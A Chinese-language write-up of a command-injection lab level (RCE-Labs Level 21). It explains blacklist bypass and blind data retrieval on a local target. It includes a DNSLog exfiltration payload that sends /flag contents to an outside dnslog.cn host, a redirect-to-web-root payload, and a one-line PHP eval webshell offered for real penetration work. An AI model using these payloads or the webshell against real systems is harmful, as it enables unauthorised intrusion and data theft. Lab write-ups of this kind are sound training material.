RCE-Labs Level 21 - ping 命令外带与重定向绕过

2026年10月3日 RCE-Labs 无回显RCE 数据外带

一、题目信息

  • 题目名称：RCE-Labs Level 21 (ping 命令 DNSLOG/ICMP 外带)
  • 靶场链接：http://靶机IP:8080/less-21/
  • 涉及工具：浏览器、DNSLog 平台（备用）

二、解题步骤

1. 分析题目考什么

黑名单封禁了 cp 和 mv。这关正式进入无回显 RCE 的领域。当常规读取命令全部失效时，通常有两种思路：一是数据外带（Out-of-Band），二是将结果写入可访问的文件。本关的核心考点是后者的降维打击：利用 Shell 重定向符 `>` 将文件写入 Web 目录。

2. 怎么想（破题思路与踩坑记录）

踩坑记录一：DNSLog 外带失败

尝试 Payload：?cmd=ping -c 1 \`sed -n '1p' /flag\`.25yzpi.dnslog.cn

失败响应：页面显示空白，DNSLog 平台刷新后没有收到任何解析记录。

原因分析：靶机 IP 为内网地址（192.168.242.225），运行在 Docker 容器内。Docker 容器默认没有外网访问权限，或者出站防火墙拦截了向公网 DNS 服务器的请求，导致数据无法外带。

改进方式：放弃外带思路，改用重定向写入 Web 目录。

踩坑记录二：重定向符静默执行

尝试 Payload：?cmd=sed -n '1,10p' /flag > 1.txt

失败响应：页面依然显示空白，看起来像是没成功。

原因分析：Shell 的 > 重定向符会将命令的标准输出（stdout）直接写入文件，而不在终端（Web 页面）打印。没有回显就是成功。

改进方式：直接去访问 http://靶机IP:8080/less-21/1.txt，验证文件是否被创建。

3. 怎么解（详细步骤与逐字翻译）

源码核心逻辑

$pattern = '/cat|tac|head|tail|more|less|nl|sort|uniq|od|xxd|hexdump|base32|base64|strings|grep|file|find|cp|mv/';
if(!preg_match($pattern,$cmd)){
    system($cmd);
}

最终成功 Payload 与操作流程

第一步：利用 `sed` 读取文件并利用 `>` 重定向写入 Web 目录

?cmd=sed -n '1,10p' /flag > 1.txt

命令逐字解析：

  • sed -n '1,10p' /flag：sed 是流编辑器，-n 表示不自动输出，'1,10p' 表示打印第 1 到第 10 行。这完美替代了被拉黑的 cat 或 head。
  • >：Shell 的重定向符。它的作用是将左侧命令的标准输出（stdout）写入到右侧的文件中。如果文件不存在则创建，存在则覆盖。
  • 1.txt：目标文件名。因为当前工作目录正是 Web 根目录 `/var/www/html/less-21`，所以文件会被直接创建在网站目录下。

第二步：通过 HTTP 协议访问写入的文件

在浏览器地址栏输入：http://靶机IP:8080/less-21/1.txt

成功响应：浏览器直接显示出明文 flag{TEST_Dynamic_FLAG}。

4. 怎么迁移（跨学科与跨领域联想）

  • 真实渗透中的 WebShell 写入：拿到 RCE 后，最常见的一步就是利用重定向符写入 Webshell，例如 echo "<?php eval(\$_POST[1]);?>" > shell.php。这是将命令执行权限转化为稳定控制权限的关键操作。
  • 日志分析与自动化：在系统运维中，脚本经常利用 > 和 >> 将程序输出写入日志文件，例如 nohup python server.py > server.log 2>&1 &，这是自动化运维的基础。

三、名词大全与原理深度复盘

1. Shell 重定向符 `>` 的底层逻辑

在 Linux 系统中，每个进程都有三个默认的文件描述符：标准输入（0, stdin）、标准输出（1, stdout）、标准错误（2, stderr）。> 是 Shell 的一种语法糖，它会在执行命令前，调用 dup2() 系统调用，将标准输出（fd=1）指向一个新的文件。这样命令产生的所有输出都会直接写入文件，而不是打印到屏幕上。WAF 往往只检测命令名称（如 `cat`、`cp`），而忽略重定向符，这就是绕过成功的根本原因。

2. 无回显 RCE 的三种主流解法

  • 回显探测：尝试让命令在报错时输出内容（如 file -f 报错，或利用 2>&1 将错误流重定向到标准输出）。
  • 数据外带（OOB）：利用 ping、curl、wget 将数据作为域名请求或 HTTP 请求的一部分带出去（受限于网络连通性）。
  • 文件写入：利用重定向符 >、>> 或 tee 命令，将结果写入 Web 目录或其他可访问的位置，再通过 HTTP 拿回结果（在本内网环境下最有效）。

四、题目思考

1. 这跟前面关卡的区别

前面所有关卡都是在尝试“如何在服务器端回显读取结果”。而 Level 21 引入了“无回显”的概念，答案不在当前页面，而需要通过写入文件或外带通道去获取。这标志着考试重点从“命令替换”彻底转向了“数据外带与提取策略”。

2. 如何抽象理解概念（大白话）

把读取文件比作“考试偷看小抄”。前面的关卡是尝试把答案念出来（cat、sed）；Level 21 的环境里，监考老师（WAF）把嘴巴捂住了（禁止回显），也不让你把纸条传出去（DNSLog 外带失败）。这时候最聪明的办法，就是把答案写在纸条上，然后塞进教室外面的公共信箱（Web 目录）。因为你人在教室外，随时可以去信箱里把纸条拿出来看（访问 1.txt），从而神不知鬼不觉地拿到了 Flag。
